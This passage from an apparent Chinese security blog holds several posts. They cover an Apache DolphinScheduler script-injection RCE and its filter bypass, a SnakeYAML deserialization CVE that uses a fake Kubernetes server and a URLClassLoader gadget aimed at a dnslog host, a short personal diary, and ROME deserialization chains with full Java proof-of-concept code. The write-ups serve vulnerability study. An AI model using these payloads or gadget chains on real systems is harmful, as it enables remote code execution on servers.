JAVA 的 js 代码执行，ScriptEngine 本身就是用 java 来实现 JS 代码执行的扩展，所以它本质还是 java 代码的执行，里面能够任意写 java 代码\n0x02 漏洞攻击实现正常的传一个 JS 的 RCE 试试\njavafunction test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(&quot;touch /tmp/stoocea&quot;)看看容器内的 tmp 目录，执行成功\n3.1.9 版本 diff 分析0x01 源码 diff 分析作者的想法是增加一个generateContentWithTaskParams方法在 SwitchTaskUtils 中这个方法的使用呢是在SwitchTaskProcessor类的setSwitchResult方法中，也就是处理 Content 的地方3.1.8 版本的逻辑是通过setTaskParams方法去处理 content到了 3.1.9 之后，作者决定彻底去除这个方法，里面获取两个 Map 的逻辑解放出来，然后处理字段的逻辑交由 SwitchTaskUtils 中新增的generateContentWithTaskParams方法来完成\njava public static String generateContentWithTaskParams(String condition, Map&lt;String, Property&gt; globalParams,\n                                                       Map&lt;String, Property&gt; varParams) &#123;\n        String content = condition.replaceAll(&quot;&#39;&quot;, &quot;\\&quot;&quot;);\n        if (MapUtils.isEmpty(globalParams) &amp;&amp; MapUtils.isEmpty(varParams)) &#123;\n            throw new IllegalArgumentException(&quot;globalParams and varParams are both empty, please check it.&quot;);\n        &#125;\n        Map&lt;String, Property&gt; params = Maps.newHashMap();\n        if (MapUtils.isNotEmpty(globalParams)) &#123;\n            params.putAll(globalParams);\n        &#125;\n        if (MapUtils.isNotEmpty(varParams)) &#123;\n            params.putAll(varParams);\n        &#125;\n        String originContent = content;\n        Pattern pattern = Pattern.compile(rgex);\n        Matcher m = pattern.matcher(content);\n        while (m.find()) &#123;\n            String paramName = m.group(1);\n            Property property = params.get(paramName);\n            if (property == null) &#123;\n                continue;\n            &#125;\n            String value;\n            if (ParameterUtils.isNumber(property) || ParameterUtils.isBoolean(property)) &#123;\n                value = &quot;&quot; + ParameterUtils.getParameterValue(property);\n            &#125; else &#123;\n                value = &quot;\\&quot;&quot; + ParameterUtils.getParameterValue(property) + &quot;\\&quot;&quot;;\n            &#125;\n            log.info(&quot;paramName:&#123;&#125;，paramValue:&#123;&#125;&quot;, paramName, value);\n            content = content.replace(&quot;$&#123;&quot; + paramName + &quot;&#125;&quot;, value);\n        &#125;\n\n        // if not replace any params, throw exception to avoid illegal condition\n        if (originContent.equals(content)) &#123;\n            throw new IllegalArgumentException(&quot;condition is not valid, please check it. condition: &quot; + condition);\n        &#125;\n        return content;\n    &#125;其实generateContentWithTaskParams 方法相较于之前的setTaskParams 的内容，只添加了如下代码：\njavaString content = condition.replaceAll(&quot;&#39;&quot;, &quot;\\&quot;&quot;);\nString originContent = content;\n\nPattern pattern = Pattern.compile(rgex);\nMatcher m = pattern.matcher(content);\n这里后续就是对 Matcher 的循环比对了，问题是这里还存了一个originContent，之后会有与 content 内容的比较，如果 content 在经历过 Matcher 之后内容不变，或者压根没进 while 循环，都会导致 content 内容和originContent 相同，然后直接抛出异常\njava if (originContent.equals(content)) &#123;\n            throw new IllegalArgumentException(&quot;condition is not valid, please check it. condition: &quot; + condition);\n&#125;铜鼓找不同我们找出了两个需要注意点，此时调试的时候还遇到了另外一个干扰点全局变量不能为空，这里全局变量看了一会官方的开发手册，我们保存工作流的时候记得添加一个全局变量就行\njava  if (MapUtils.isEmpty(globalParams) &amp;&amp; MapUtils.isEmpty(varParams)) &#123;\n            throw new IllegalArgumentException(&quot;globalParams and varParams are both empty, please check it.&quot;);\n        &#125;\n0x02 尝试绕过所以总结起来我们一共需要绕过三个点String content = condition.replaceAll(&quot;&#39;&quot;, &quot;\\&quot;&quot;);对于 payload 中的&#39;被替换为了 \\&quot;转义后的双引号 if (MapUtils.isEmpty(globalParams) &amp;&amp; MapUtils.isEmpty(varParams))设置一个全局变量，不让 if 判断走进去抛异常以及 Matcher 在匹配的循环中，content 必须要有$&#123;xxxx&#125;格式的字符串，不然无法进行替换，也就和 origincontent 产生不了差别这里我们首先尝试如下 payload\njavafunction test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(&quot;calc&quot;)$&#123;test&#125;这里稍微调试一下都能理解，其实${xxx}格式的字符串，在DolphinScheduler 中表示取全局变量，也就是从我们刚才保存工作流的同时设置的全局变量（暂时只发现这一个功能）那么这里我 test 全局变量设置的是 nopstoocea打断点调试一下直接到generateContentWithTaskParams 的逻辑，前面获取到 switch 以及 condition(content) 的内容都是不变的\n\n\ncontent 照样获取，只是&#39;被替换为了 \\&quot;,几番尝试之后其实可以判定我们 payload 是不会收影响的\n由于我们设置了 globalparams 所以 if (MapUtils.isEmpty(globalParams) &amp;&amp; MapUtils.isEmpty(varParams))不会进去抛异常\nMatcher 的构造其实涉及到 content 以及全局变量，这里之后 while 循环，由于我们 content（switch 的条件内容 condition）中带有$&#123;test&#125;,正好被他的正则匹配到了，所以这里 while 循环初步 find 一定能够找到\n进入之后 while 循环，其实它里面的内容就是将 content 内容中${test}一个一个替换出实际的值，并且会去掉$&#123;&#125;外壳，通过键值对寻找的方式从 globals 或者 var 中替换真实的值，比如我们这里 test&#x3D;&gt;nopstoocea\n\n那么后续 content 出来就是之后肯定就会和 origincontent 不同了，然后返回这个 content 出去，顺利送入 evaluate那其实绕过思路就出来了，我们把 payload 放入${}中就行，先尝试一下\n然后保存工作流的时候，记得全局变量 payload 设置一下 payload:function test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(\\&quot;touch /tmp/stooceashell\\&quot;)最终 content 就为我们设置的全局变量\nCVE-2023-491090x01 初步定位根据漏洞提送的报告，好像是一个 snakeyaml 反序列化漏洞不过具体功能还是心里没有底，diff 一下源码https://github.com/apache/dolphinscheduler/pull/14991/commits/5d03771107576910dd690f7f835f28ba17c11499可以看到的是 createnamespace 以及 updatenamespace 这一块全部删除只剩下这一段 controller\njavapublic Result createNamespace(@Parameter(hidden = true) @RequestAttribute(value = Constants.SESSION_USER) User loginUser,\n                                  @RequestParam(value = &quot;namespace&quot;) String namespace,\n                                  @RequestParam(value = &quot;clusterCode&quot;) Long clusterCode) &#123;\n\n Map&lt;String, Object&gt; result =\n                k8sNamespaceService.createK8sNamespace(loginUser, namespace, clusterCode);\n        return returnDataList(result);\n    &#125;\n也就是中间的处理逻辑都没有了，根据这段评论可以了解得到更新**K8sNamespace**的内容全部删除了，只剩下一段创建的逻辑所以，本次改动将 createNamespace的内容和 upadateNamespace 的内容合并了，只剩下了createK8sNamespace(loginUser, namespace, clusterCode);的逻辑处理。当然这只是仅仅针对于 controller 路由的内容，当前 commit 下其实还有很多地方修改了，不过都是针对于当前功能实现逻辑的删除，我们跟进当前路由的逻辑即可\n0x02 漏洞逻辑分析diff 之后剩下了 k8sNamespaceService.createK8sNamespace(loginUser, namespace, clusterCode, limitsCpu, limitsMemory);，也就是说k8sNamespaceService.updateK8sNamespace被删除了，我们跟进的话，肯定是跟进updateK8sNamespace（事后走逻辑分析，这里其实不论是 create 还是 update 都能触发，因为两者实现功能的逻辑是一样的，不然两个功能为什么能合并呢）调试环境都是一样的使用 idea 远程调试，docker 环境也还是之前的，只要不是 3.2.1 版本及以后的就行触发点在哪呢？那么根据路由的 english，应该就是找 k8s 的 createnamespace 或者 update 都行翻找一下后台应该很容易就找到了，limitcpu，limitsMemory 都能正确对应这里随便填数据之后，断点打在 create 就行这里跟进之后会发现有一段 if 判断逻辑过不去，也就是我们首次跟进createK8sNamespace的时候，获取数据以及 set 属性变量之后，他会判断我们当前指定的集群环境是否为已有或已经加载的集群环境，如果是的话，就不会进入 yaml 的字符串处理和加载了，所以这里我们需要新建一段集群环境\n\n\n\n\n\n\n\n\n\n直到这里遇到了很大的问题，这里我选择的是 docke 环境搭建，在后台创建集群环境需要按照正常的格式去写配置信息，写了之后还没完，它是真会往你所写的地址上找同名的 namespace，不然最后将找到的 namespace list 的时候会报空错，也就是找不到有效的 namespace。这里我实在没有学过 k8s 相关的内容，去请教了 drunkbaby 师傅，推荐了一篇文章，这才找到了正解。（顺便吐槽一些文章，说环境不行，直接 idea evaluate expression 执行 yaml.loadAs。。可能是我水平不够，就喜欢钻这些点吧）\n参考文章如下https://xz.aliyun.com/t/13981\nyamlapiVersion: v1\nclusters:\n- cluster:\n    server: http://127.0.0.1:5000\n  name: kubernetes\ncontexts:\n- context:\n    cluster: kubernetes\n  name: kubernetes-admin@kubernetes\ncurrent-context: kubernetes-admin@kubernetes\nkind: Config\npreferences: &#123;&#125;\nusers: []师傅的本地 flask 脚本要改一下，下面这段 flaskpy 代码的内容，大致就是伪造了一个集群 server，保证对方在目标集群中查询 namespace 的时候能够找到同名的 namespace，这也是为什么我们伪造集群中的 namespace 的 name 是那一段 yamlpayload\npythonfrom flask import Flask, jsonify\n\napp = Flask(__name__)\n\n@app.route(&#39;/api/v1/namespaces&#39;, methods=[&#39;GET&#39;,&#39;POST&#39;])\ndef get_namespaces():\n    namespaces = &#123;\n  &quot;kind&quot;: &quot;NamespaceList&quot;,\n  &quot;apiVersion&quot;: &quot;v1&quot;,\n  &quot;metadata&quot;: &#123;\n    &quot;selfLink&quot;: &quot;/api/v1/namespaces&quot;,\n    &quot;resourceVersion&quot;: &quot;123456&quot;\n  &#125;,\n  &quot;items&quot;: [\n    &#123;\n      &quot;metadata&quot;: &#123;\n        &quot;name&quot;: &quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\&quot;\n175i4z.dnslog.cn\\&quot;]]]]&quot;,\n        &quot;uid&quot;: &quot;9c8b7a6f&quot;,\n        &quot;creationTimestamp&quot;: &quot;2024-02-22T12:00:00Z&quot;\n      &#125;,\n      &quot;spec&quot;: &#123;\n        &quot;finalizers&quot;: []\n      &#125;,\n      &quot;status&quot;: &#123;\n        &quot;phase&quot;: &quot;Active&quot;\n      &#125;\n    &#125;\n  ]\n&#125;\n    return jsonify(namespaces)\n\nif __name__ == &#39;__main__&#39;:\n    app.run(debug=True,host=&#39;192.168.86.135&#39;)后续就能够跟进到upsertNamespacedResourceToK8s(k8sNamespace, yamlStr)中执行 yaml 代码了，后续就不跟进了，这一段基本功看的我五体投地\n补充一点忘记写了：这里 yaml 代码的获取是在上述upsertNamespaceToK8s方法中，他会获取到我们传入的 namespace，执行 getNamespaceFromK8s 方法我们跟进getNamespaceFromK8s，这里的逻辑是创建一段标准的 namespaceyaml 格式 字符串，然后根据${}标识符替换内容，我们传参的 namespace 就是在这一步被替换上去的，具体的由于时间过久了，这一部分是我事后补充的，搭建环境就没复现了，师傅们可以自己跟进一波\n","slug":"Apache DolphinScheduler 任意代码执行漏洞分析","date":"2024-04-26T04:00:00.000Z","categories_index":"CVE","tags_index":"CVESearch","author_index":"stoocea"},{"id":"e27ee1420eabe8cdee8a787b1e2c29ea","title":"Re_Life","content":"最近也是很累啊，实习考核迫近，渗透和实战这块由于前期经验和学习时间分配的过少，导致现在就是天天挤时间恶补，但是一到关于内网这种基础知识我真的是半点看不懂啊（我就是个垃圾），导致每天学渗透或者实战的时候都让我心口不太舒服。。。。不过路还是得走，继续学就是了。不过这两天抽点时间出来学学 java 是真的舒畅啊，从早干到晚都不累（果然人还是习惯呆在舒适区，要努力走出去）然后就是这几天看各大比赛线下和线上都开了，师傅们都在五湖四海地飞，长城杯本来有机会打的，由于我个人的原因导致校队没有报上去。。（orz 谢罪）然后看了西湖论剑的直播，第一名是南邮✌，一想到南邮✌就想到那位和我同届的神，之前打他们的 NCTF 有幸和他交流过，能够感受到它的专业和认真以及对人的温柔，不是我能比的。然后看他的博客是 17 年就在更新了，令人感慨。之后突然想起大一上学期每天坚持看的一个视频，是南京大学软件分析课的老师–李樾老师在最后一节课对同学们讲的主题视频—《大学除了专业知识，还应该学些什么？》，里面提到一段内容，我回忆如下：“在做的有些同学都想当 TOP，但 TOP 并不仅仅只是看你的努力程度，总会有比你更优秀的人，但他们的能力不是单单只看他个人，还有他 20 年前他们家族的努力以及环境所共同早就的”，所以，我回想起感触最深的一句话“找到你自己的定位，用你现在的经历和资源，去成为你自己。”我能到什么程度呢？我是谁呢？这些问题都太空了，我首要要解决的是眼前手头的事，做好眼前的事，心里明白：前面有一座又一座的山需要我去翻越好像也是一年前这个时候写的这个视频的观后感，一年过去了好像才能真正的体会李樾老师的话：“知难而进，贵在坚持，省察体悟，贵于改过”与师傅们共勉\n","slug":"Re_Live","date":"2024-03-31T15:59:00.000Z","categories_index":"Life","tags_index":"Felling","author_index":"stoocea"},{"id":"e970de931116b46072f87505ec6a02f5","title":"ROME攻击链分析","content":"什么是 ROMEROME 是一个关于 RSS 和 Atom 格式的 java 框架那什么是 RSS 和 Atom 呢？RSS 全称：RDF Site Summary 或 Really Simple Syndication，中文翻译为简易信息聚合，也叫做聚合内容。它是一种消息来源的格式,主要作用用在聚合多个网站的更新内容，并且能够自动通知网站订阅者。同时 RSS 能够以摘要的形式将信息呈现，帮助订阅者快速游览。（比如 bilibili 的动态？）Atom 本身就是一个名词，它更加具体的名称是 Atom Syndication Format ，中文译为 Atom 供稿格式。Atom 的诞生是为了解决 RSS 在各个版本遇到的问题，降低 web 内容聚合的难度，特地特出来的一种信息格式。RSS 的内容需要通过 RSS 阅读器查看，而 ROME 就是其中一个比较老的 RSS 阅读器了。\n环境搭建xml&lt;dependency&gt;  \n    &lt;groupId&gt;rome&lt;/groupId&gt;  \n    &lt;artifactId&gt;rome&lt;/artifactId&gt;  \n    &lt;version&gt;1.0&lt;/version&gt;  \n&lt;/dependency&gt;  \n&lt;dependency&gt;  \n    &lt;groupId&gt;org.javassist&lt;/groupId&gt;  \n    &lt;artifactId&gt;javassist&lt;/artifactId&gt;  \n    &lt;version&gt;3.28.0-GA&lt;/version&gt;  \n&lt;/dependency&gt;ROME 组件分析0x01 ToStringBean我们先看他的结构然后理解一下这个类是用来干什么的？从名称我们可以得知，它主要作用是用来打印信息的，所有方法都是用来 print 和 toString。要想将目标类信息打印出来，首先就应该获取对应类信息，那获取对应类信息最直接的就是 get 方法了，这里获取类属性值就是通过对应类的 get 方法获取的我们重点看 toString 方法在 toString 有参方法中，它会接收一段 StringBuffer 参数（类字节码），在经过信息处理和特征获取后，他会经历一段 for 循环，用来循环遍历类中的 get 方法，并且在最后执行该 get 方法for 循环里面是通过getReadMethod()方法来获取 get 方法的获取完 get 方法之后还会经过一层 if 的判断筛选，条件如下\n\n\n\n\n\n\n\n\n\n首先当前 get 方法数组的值不能为空不能是 Object 父类的 get 方法过滤有参数的 get 方法\n在经过这三层筛选之后，直接invoke 方法调用与 toString 有参方法有联系的只有 toString 的无参方法了，我们的思路是能够通过调用 toString 无参方法间接去调用有参的 toString，或者直接调有参 toString 也行这里最开始的思路是通过 hashMap CC6 那条链子起手，通过调用**EqualsBean **的 beanHashCode()方法，进一步调到 toString 无参方法\n0x02 EqualsBean他也能作为一段 ROME 链的最终触发点，也就是调用 get 方法触发点在它的beanEquals 方法中，整体逻辑和 toStringBean 的 tosting 差不多，都是获取到 get 方法之后通过 invoke 调用，但由于他是 equals 方法的缘故，要两者进行比较，所以会两次调用 get 方法，来判断两者是否相等，这一点在我们之后分析它的攻击链时会用到\nROME 链流程分析0x01 ObjectBean利用链javaHashMap&lt;K,V&gt;.readObject(ObjectInputStream)\nHashMap&lt;K,V&gt;.hash(Object)\nObjectBean.hashCode()\nEqualsBean.hashCode()                  \nEqualsBean.beanHashCode()\nToStringBean.toString()\nToStringBean.toString(String)\nTemplatesImpl.getOutputProperties()最后就是 fastjson 中最常见的通过getOutputProperties 链去加载字节码了POC 如下：\njavaimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.syndication.feed.impl.ObjectBean;\nimport com.sun.syndication.feed.impl.ToStringBean;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class POC &#123;\n    public static void main(String[] args) throws Exception&#123;\n        //javassist写恶意字节码\n        ClassPool pool = ClassPool.getDefault();\n        CtClass ctClass = pool.makeClass(&quot;i&quot;);\n        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);\n        ctClass.setSuperclass(superClass);\n        CtConstructor constructor = ctClass.makeClassInitializer();\n        constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;);\n        byte[] bytes = ctClass.toBytecode();\n\n        //反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制\n        TemplatesImpl templatesImpl = new TemplatesImpl();\n        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);\n        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;a&quot;);\n        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);\n\n        //配置ToStringBean中的_beanClass，指定要toString出的类\n        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);\n        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);\n        Map hashMap = new HashMap();\n        hashMap.put(objectBean, &quot;x&quot;);\n\n        setFieldValue(objectBean, &quot;_cloneableBean&quot;, null);\n        setFieldValue(objectBean, &quot;_toStringBean&quot;, null);\n\n        ByteArrayOutputStream bs = unSerial(hashMap);\n        // 输出序列化的Base64编码字符\n        Base64Encode(bs);\n    &#125;\n    private static ByteArrayOutputStream unSerial(Map hashMap) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(hashMap);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n\n\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n&#125;\n1x01 流程分析初步的断点打在 readObject 方法处然后我们跟进其 readObject，很熟悉的流程，就不多做赘述了后续直接跟进到 ObjectBean 的 hashCode这里会调用到 equalsBean 的 beanHashCode()，继续跟进由于刚才我们赋值的时候给 _obj 赋值上了构造好的 toStringBean，这里直接调 toStringBean 的无参 toString这里直接一路跟到有参 toString 就行，先是通过 getPropertyDescriptors 方法获取到关于 TemplatesImpl 的包装类，然后通过包装类 pds 的 getReadMethod 方法获取所有的 get 方法这里第一个就是获取 getOutputProperties 方法返回之后开始调用，直接跟进 invoke跟进到 TemplateImpl 的getOutputProperties 方法，这里会调用 newTransformer()方法后续就是 newTransformer-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;loader.defineClass 加载恶意类的流程，不过多赘述其实 ObjectBean 这条链子还是好分析，毕竟大部分内容都是我们之前学过的，只有中间 toStringBean 方法会调用类中 get 方法的特性是第一次接触\n0x02 HashTable利用链针对 HashMap 被 ban 的情况，其实就是 CC7 和 CC6 的区别、在 HashTable 的 readObject 方法中，他会对 HashTable 中的每一个元素都调用 reconstitutionPut 方法之前这里还存在一个 hash 碰撞的问题，只不过具体的要进入 for 循环调用 equals 方法，我们这里需要调用到 hashcode 方法就行，没必要考虑这个问题后面 hashcode 就是接ObjectBean利用链后段了调用栈如下\njavaHashTable.readObject(ObjectInputStream)\nHashTable.reconstitutionPut()              \nObjectBean.hashCode()\nEqualsBean.hashCode()                  \nEqualsBean.beanHashCode()\nToStringBean.toString()\nToStringBean.toString(String)\nTemplatesImpl.getOutputProperties()POC 如下：把 hashmap 换成 hashtable 就行\njavaimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.syndication.feed.impl.ObjectBean;\nimport com.sun.syndication.feed.impl.ToStringBean;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Hashtable;\nimport java.util.Map;\n\npublic class HashTablePOC &#123;\n    public static void main(String[] args) throws Exception&#123;\n        //javassist写恶意字节码\n        ClassPool pool = ClassPool.getDefault();\n        CtClass ctClass = pool.makeClass(&quot;i&quot;);\n        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);\n        ctClass.setSuperclass(superClass);\n        CtConstructor constructor = ctClass.makeClassInitializer();\n        constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;);\n        byte[] bytes = ctClass.toBytecode();\n\n        //反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制\n        TemplatesImpl templatesImpl = new TemplatesImpl();\n        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);\n        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;a&quot;);\n        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);\n\n        //配置ToStringBean中的_beanClass，指定要toString出的类\n        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);\n        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);\n        Hashtable hashtable = new Hashtable();\n        hashtable.put(objectBean, &quot;x&quot;);\n\n        setFieldValue(objectBean, &quot;_cloneableBean&quot;, null);\n        setFieldValue(objectBean, &quot;_toStringBean&quot;, null);\n\n        ByteArrayOutputStream bs = unSerial(hashtable);\n        // 输出序列化的Base64编码字符\n        Base64Encode(bs);\n    &#125;\n    private static ByteArrayOutputStream unSerial(Map hashMap) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(hashMap);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n\n\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n&#125;\n流程就不跟进到了，后程一样\n0x03 BadAttributeValueExpExceptionCC5 的 BadAttributeValueExpException，他的 readObject 方法能够直接调用 toString 方法调用的是 valObj 的 toString，我们看看前面 valObj 是通过反射 ObjectInputStream.GetField，然后获取到 val 参数的值，那我们也直接反射写入就行只不过这样利用链就稍微有点变化了，我们可以直接调用 ToStringBean 的无参 toString()方法了调用栈如下:\njavaBadAttributeValueExpException.readObject()\nToStringBean.toString()\nToStringBean.toString(String)\nTemplatesImpl.getOutputProperties()POC 如下\njavaimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.syndication.feed.impl.ObjectBean;\nimport com.sun.syndication.feed.impl.ToStringBean;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\nimport javax.management.BadAttributeValueExpException;\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Hashtable;\nimport java.util.Map;\n\npublic class BadAttributeValueExpExceptionPOC &#123;\n    public static void main(String[] args) throws Exception&#123;\n        //javassist写恶意字节码\n        ClassPool pool = ClassPool.getDefault();\n        CtClass ctClass = pool.makeClass(&quot;i&quot;);\n        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);\n        ctClass.setSuperclass(superClass);\n        CtConstructor constructor = ctClass.makeClassInitializer();\n        constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;);\n        byte[] bytes = ctClass.toBytecode();\n\n        //反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制\n        TemplatesImpl templatesImpl = new TemplatesImpl();\n        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);\n        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;a&quot;);\n        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);\n\n        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);\n        setFieldValue(badAttributeValueExpException,&quot;val&quot;,toStringBean);\n        // 执行序列化与反序列化，并且返回序列化数据\n        ByteArrayOutputStream bs = unSerial(badAttributeValueExpException);\n        // 输出序列化的Base64编码字符\n        Base64Encode(bs);\n    &#125;\n\n    private static ByteArrayOutputStream unSerial(Object o) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(o);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n&#125;1x01 调用流程分析稍微分析一下断点还是打在 readObject 方法上，跟进由于刚才我们对 badAttributeValueExpException 反射赋值了 val 为 toStringBean 类，所以这里应该会直接到toStringBean 的 toString()一路跟进到有参 toString，invoke 调用后续就不跟了，一样的流程\n0x04 HotSwappableTargetSource 利用链这条链子属于 spring 原生 toString 利用链，也就是在目标有 spring 依赖的情况下，可以尝试这条链子\nxml&lt;dependency&gt;\n      &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;\n      &lt;version&gt;5.3.28&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;\n      &lt;version&gt;5.3.28&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;\n      &lt;version&gt;5.3.28&lt;/version&gt;\n    &lt;/dependency&gt;1x01  功能分析HotSwappableTargetSource 位于org.springframework.aop.target包下，可以在代理 bean 运行的过程中，动态实时更新 bean 对象，也就是热加载其中的方法大多都是用来对目标 bean 的操作，以及获取 bean 的相关信息为主，至于利用链，我们拼接了它的 equals 方法其中 target 值是可控的，直接构造方法中传值进去就行后续的调用涉及到XString这个类，他是关于 Xpath 相关操作的类，具体就不看了直接看它的 equals 方法，最终调用到了 obj2 的 toString 方法，这里 obj2 的赋值有点讲究，我们回顾之前 equals 方法的内容，quals 方法的参数是 that.target，并且这个 that 的类型是HotSwappableTargetSource 本身，所以我们这里需要两次实例化不同的HotSwappableTargetSource，第一次实例化构造 target 为 Xstring，第二次实例化新的HotSwappableTargetSource，target 构造为 toStringBean，这样才能保证 obj2 被赋值为 toStringBean接着后续就是直接调用 toStringBean 的 toString 方法就行\n1x02 流程利用分析后半段的流程已经分析完毕，现在集中解决上半段触发的问题，此时我脑海中有两种思路，一种是通过 hashmap 的 readObject 作为入口，后续触发putVal 那一条，还有一种思路是通过 HashTable 的 readObject 去触发。两者我都去尝试一下了，hashmap 是肯定是可以的，但是 hashtable 要想触发 euals 方法就必须经过 hash 碰撞，这里不是说我们不能满足 hash 碰撞，而是我们现在的目标类HotSwappableTargetSource，他本身就不是 map 类型，导致我们无法”yy”,”zZ”字符串去绕过 hash 碰撞问题，所以暂时只分析 hashmaphashMap 的 readObject 入口，当调用到 putval 方法时，也会在其中调用到 equals 方法\n2x01 hashMap 入口调用栈如下：\njavaHashMap.readObject\nHashMap.putVal\nHotSwappableTargetSource.equals\nXString.equals\nToStringBean.toStringPOC 如下：\njavaimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xpath.internal.objects.XString;\nimport com.sun.syndication.feed.impl.ToStringBean;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\nimport org.springframework.aop.target.HotSwappableTargetSource;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\n\npublic class HotSwappableTargetSourcePOC &#123;\n    public static void main(String[] args)throws Exception &#123;\n\n        //利用javassist写恶意字节码\n        ClassPool pool = ClassPool.getDefault();\n        CtClass ctClass = pool.makeClass(&quot;i&quot;);\n        CtClass superClass = 